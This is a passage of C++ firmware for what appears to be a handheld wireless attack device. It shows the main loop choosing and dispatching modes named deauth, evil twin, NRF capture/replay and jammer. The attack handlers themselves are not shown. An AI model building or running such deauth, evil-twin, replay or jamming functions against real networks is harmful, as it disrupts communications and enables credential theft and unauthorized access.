  setupBLE(); setupNRF(); SPIFFS.begin(true);
  delay(400); drawIdle();
}

void loop() {
  updateBoot();

  // Switch-based mode (takes priority over button)
  AppMode sw=getSwitchMode();
  if (sw!=MODE_IDLE && sw!=currentMode) {
    currentMode=sw; onModeEnter(currentMode);
  } else if (sw==MODE_IDLE && currentMode!=MODE_IDLE && !switchActive() && !isHolding) {
    currentMode=MODE_IDLE; onModeEnter(MODE_IDLE);
  }

  // Hold = mode cycling (only when no switch active)
  if (!switchActive()) {
    if (evtHoldStart) { holdCycleLast=millis(); drawHoldOverlay(); }
    if (isHolding && millis()-holdCycleLast>=600) {
      holdCycleIdx=(holdCycleIdx+1)%NUM_CYCLE;
      holdCycleLast=millis(); drawHoldOverlay();
    }
    if (evtHoldEnd) { currentMode=cycleModes[holdCycleIdx]; onModeEnter(currentMode); }

    // Triple = exit to idle when using button navigation
    if (evtTriple && currentMode!=MODE_IDLE) {
      if (jamActive) jamStop();
      currentMode=MODE_IDLE; onModeEnter(MODE_IDLE);
      return;
    }
  }

  switch (currentMode) {
    case MODE_IDLE:
      { static unsigned long li=0; if(millis()-li>500){drawIdle();li=millis();} break; }
    case MODE_BLE_SCAN:    handleBLE();        break;
    case MODE_DEAUTH:      handleDeauth();     break;
    case MODE_EVIL_TWIN:   handleEvilTwin();   break;
    case MODE_NRF_CAPTURE: handleNRFCapture(); break;
    case MODE_NRF_REPLAY:  handleNRFReplay();  break;
    case MODE_JAMMER:      handleJammer();     break;
  }
}
